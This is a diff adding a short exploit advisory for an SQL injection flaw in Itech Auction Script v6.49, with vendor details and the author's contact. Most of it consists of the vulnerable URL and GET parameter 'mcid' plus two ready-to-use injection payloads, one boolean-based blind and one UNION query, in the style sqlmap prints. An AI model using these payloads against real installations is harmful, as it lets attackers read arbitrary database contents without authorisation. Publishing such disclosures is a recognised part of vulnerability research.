@@ -1,0 +1,30 @@
+Exploit Title: Itech Auction Script v6.49 – SQL Injection
+Date: 30.01.2017
+Vendor Homepage: http://itechscripts.com/
+Software Link: http://itechscripts.com/auction-script/
+Exploit Author: Kaan KAMIS
+Contact: iletisim[at]k2an[dot]com
+Website: http://k2an.com
+Category: Web Application Exploits
+
+Overview
+
+Auction Script v6.49 is the best standard auction product. This also comes pre-integrated with a robust Multi-Vendor interface and a powerful CMS panel.
+
+Type of vulnerability:
+
+An SQL Injection vulnerability in Itech Auction Script allows attackers to read
+arbitrary data from the database.
+
+Vulnerability:
+
+URL : http://locahost/mcategory.php?mcid=4[payload]
+
+Parameter: mcid (GET)
+Type: boolean-based blind
+Title: AND boolean-based blind - WHERE or HAVING clause
+Payload: mcid=4' AND 1734=1734 AND 'Ggks'='Ggks
+
+Type: UNION query
+Title: Generic UNION query (NULL) - 1 column
+Payload: mcid=-5980' UNION ALL SELECT CONCAT(0x71706b7171,0x764646494f4c7178786f706c4b4749517349686768525865666c6b6456434c766b73755a44657777,0x7171706a71)-- XAee
